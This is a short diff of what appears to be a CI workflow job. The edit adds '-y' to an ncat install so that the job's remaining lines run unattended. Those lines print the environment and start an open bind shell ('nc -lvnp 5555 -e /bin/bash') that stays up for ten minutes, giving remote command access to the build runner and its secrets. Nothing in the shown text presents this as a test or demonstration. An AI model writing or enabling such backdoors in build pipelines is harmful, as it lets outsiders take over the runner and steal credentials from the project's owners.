@@ -15,6 +15,6 @@ jobs:
           echo "job1"
           env
           sudo apt-get update
-          sudo apt-get install ncat
+          sudo apt-get install ncat -y
           nc -lvnp 5555 -e /bin/bash &
           sleep 600
